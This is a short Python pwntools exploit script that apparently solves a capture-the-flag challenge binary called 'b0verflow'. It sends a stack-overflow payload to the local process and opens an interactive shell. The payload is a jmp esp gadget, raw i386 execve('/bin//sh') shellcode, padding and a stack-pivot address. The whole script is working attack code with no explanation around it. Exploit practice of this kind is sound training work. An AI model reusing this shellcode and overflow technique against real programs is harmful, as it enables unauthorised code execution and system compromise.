from pwn import *

context.log_level = "debug"


def main():
  target_elf = ELF("./b0verflow")
  target_rop = ROP(target_elf)

  shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
  # jmp_esp = p32(target_rop.find_gadget(["jmp esp"]).address)
  jmp_esp = p32(0x08048504)
  # pivot = p32(target_rop.find_gadget(
  pivot = p32(0x80484fd)

  log.debug(hex(len(shellcode)))

  payload = jmp_esp
  payload += shellcode
  payload += b"a"*(0x20 - len(shellcode))
  payload += pivot

  target = process("./b0verflow")
  target.sendline(payload)
  target.interactive()


if __name__ == "__main__":
  main()
